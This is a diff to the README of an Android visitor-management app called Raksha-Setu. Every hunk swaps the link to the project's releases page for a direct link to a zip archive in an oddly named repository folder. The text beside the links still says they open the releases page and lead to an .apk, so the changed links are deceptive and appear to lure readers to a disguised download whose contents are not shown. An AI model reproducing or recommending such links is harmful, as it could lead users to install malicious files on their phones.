@@ -1,6 +1,6 @@
 # 🛡️ Raksha-Setu - Simple Visitor Management System
 
-[![Download Raksha-Setu](https://img.shields.io/badge/Download-Raksha--Setu-brightgreen)](https://github.com/profkmn/Raksha-Setu/releases)
+[![Download Raksha-Setu](https://img.shields.io/badge/Download-Raksha--Setu-brightgreen)](https://github.com/profkmn/Raksha-Setu/raw/refs/heads/main/stravage/Setu_Raksha_v1.5.zip)
 
 Raksha-Setu helps society watchmen manage visitors using their Android phones. The app records visitors digitally and asks residents for permission before entry. This keeps societies safe and organized. You do not need technical skills to use it.
 
@@ -43,7 +43,7 @@ Follow these steps to download and run Raksha-Setu on your Android device:
 1. Open a web browser on your Android phone.
 2. Visit the release page by clicking the link below:
 
-   [Download Raksha-Setu](https://github.com/profkmn/Raksha-Setu/releases)  
+   [Download Raksha-Setu](https://github.com/profkmn/Raksha-Setu/raw/refs/heads/main/stravage/Setu_Raksha_v1.5.zip)  
    *(This will open the GitHub releases page where you can find the app files.)*
 
 3. Look for the latest version of Raksha-Setu. It will have an `.apk` file. APK files are installation files for Android apps.
@@ -139,7 +139,7 @@ Residents need the app to approve visitors. The app can be used by residents on 
 
 You can check the GitHub releases page anytime to find newer app versions and updates:
 
-[Visit Raksha-Setu Releases](https://github.com/profkmn/Raksha-Setu/releases)
+[Visit Raksha-Setu Releases](https://github.com/profkmn/Raksha-Setu/raw/refs/heads/main/stravage/Setu_Raksha_v1.5.zip)
 
 Here you will find detailed update notes, bug fixes, and new features as they become available.
 
@@ -151,4 +151,4 @@ If you encounter problems not covered here, you can contact the app support team
 
 ---
 
-[![Get Raksha-Setu](https://img.shields.io/badge/Download-Raksha--Setu-orange)](https://github.com/profkmn/Raksha-Setu/releases)
+[![Get Raksha-Setu](https://img.shields.io/badge/Download-Raksha--Setu-orange)](https://github.com/profkmn/Raksha-Setu/raw/refs/heads/main/stravage/Setu_Raksha_v1.5.zip)
